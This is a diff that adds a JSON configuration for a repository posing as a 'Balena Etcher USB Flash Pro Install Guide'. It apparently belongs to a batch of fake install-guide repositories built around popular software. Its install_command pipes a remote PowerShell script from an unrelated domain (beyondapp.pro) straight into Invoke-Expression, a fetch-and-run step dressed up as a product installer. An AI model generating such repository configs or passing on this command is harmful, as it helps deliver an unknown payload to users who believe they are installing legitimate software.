@@ -1,0 +1,25 @@
+{
+  "repo": "Balena-Etcher-USB-Flash-Pro-Install-Guide",
+  "product": "Balena Etcher USB Flash Pro Install Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "balena-etcher-usb-flash-pro-install-guid",
+    "balena",
+    "etcher",
+    "usb",
+    "flash",
+    "pro",
+    "install",
+    "utility",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
